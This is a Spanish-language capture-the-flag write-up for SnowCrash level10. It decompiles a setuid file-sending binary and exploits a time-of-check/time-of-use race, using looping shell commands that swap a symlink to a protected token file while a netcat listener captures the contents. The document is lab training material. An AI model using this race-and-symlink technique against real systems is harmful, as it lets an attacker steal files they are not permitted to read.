- Dos archivos con estos permisos:
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
- ejecuto el ./level10
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
- Creo un archivo en tmp y ejecuto sobre este
echo "HOLA" > /tmp/a
./level10 /tmp/a $(hostname -I)
./level10 file host
        sends file to host if you have access to it
- Parece que ./level10 envía el contenido de una archivo a una ip
- Descargamos en local el archivo level10
- Descompilamos con Ghidra
- En el main encontramos:
38 printf("Connecting to %s:6969 .. ",__cp)
- El puerto que espera la conexion es el 6969
- Usamos tmux en la maquina snow-crash

- console1:
level10@SnowCrash:~$ echo "HOLA" > /tmp/a

- console2:
level10@SnowCrash:~$ nc -l 6969

- console1:
level10@SnowCrash:~$ ./level10 /tmp/a $(hostname -I)

- console2 output:
.*( )*.
HOLA

- Bien, sabemos lo que hace
- Volvemos a Ghidra
- Vemos:
36  iVar2 = access((char *)in_stack_00000008[1],4);
37  if (iVar2 == 0) 
    { ... }
89  else {
90    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
91  }
- Solo envía el archivo si tenemos permisos de archivo
- Pera hay un posible vector de ataque TOCTOU(Time-of-check to time-to-use)
https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
https://lucabarile.github.io/Blog/toctou/index.html

    

- console1:
level10@SnowCrash:~$ ./level10 /tmp/a $(hostname -I)

- console2:
level10@SnowCrash:~$ nc -l 6969

- condole1:
level10@SnowCrash:~$ while true; do ./level10 /tmp/a $(hostname -I); done

- console2:
level10@SnowCrash:~$ while true; do echo "" > /tmp/a; rm -f /tmp/a; ln -s ~/token /tmp/a; rm -f /tmp/a; done

- console3:
level10@SnowCrash:~$ while true; do nc -l 6969 | grep -v "\( \)"; done

- tenemos la pass :)

